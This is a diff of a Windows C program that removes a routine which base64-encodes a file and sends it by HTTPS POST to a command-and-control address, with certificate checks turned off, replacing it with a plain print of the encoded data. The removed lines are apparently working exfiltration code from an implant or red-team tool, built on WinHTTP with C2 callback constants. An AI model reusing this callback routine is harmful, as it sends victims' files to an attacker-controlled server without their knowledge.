@@ -74,58 +74,5 @@ void main ()
     file_b64 = (char*)malloc(fsize * 2);
     file_b64 = base64_encode((const char*)fcontent, fsize, &fsize);
 
-    // printf("base64 out: %s\n", file_b64);
-
-    // initiate the winhttp session
-    hSession = WinHttpOpen((LPCWSTR)_CALLBACK_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-
-    // check if we failed
-    if (!hSession)
-    {
-        // let the user know we failed
-        printf("ERROR: WinHttpOpen, code: %d\n", GetLastError());
-        return;
-    }
-
-    // make the connection
-    hConnect = WinHttpConnect(hSession, (LPCWSTR)_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, 0);
-
-    if (!hConnect)
-    {
-        printf("ERROR: WinHttpConnect, code: %d\n", GetLastError());
-        return;
-    }
-
-    // setup the request
-    hRequest = WinHttpOpenRequest(hConnect, L"POST", _C2CALLBACK_URI, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
-
-    if (!hRequest)
-    {
-        printf("ERROR: WinHttpOpenRequest, code: %d\n", GetLastError());
-        return;
-    }
-
-    // lets ignore invalid certs
-    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
-    {
-        printf("ERROR: WinHttpSetOption, code: %d\n", GetLastError());
-        return FALSE;
-    }
-
-    // set up the buffer
-    ReqBuffer = (LPCWSTR)malloc(strlen(file_b64) + 100);
-    memset(ReqBuffer, '\0', strlen(ReqBuffer));
-    sprintf(ReqBuffer, "{\"id\":\"%s\", \"opcode\":%d, \"data\":\"%s\"}", SESSION_ID, DO_CALLBACK, file_b64);
-
-    // send the request to get the file from the c2
-    BOOL bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)ReqBuffer, strlen((char*)ReqBuffer), strlen((char*)ReqBuffer), 0);
-
-    // check if the request was successful
-    if (bResults)
-    {       
-        bResults = WinHttpReceiveResponse(hRequest, NULL);
-    }
-
-    printf("\033[1;32m[+]\033[0m File Downloaded.\n");
+    printf("%s", file_b64);
 }
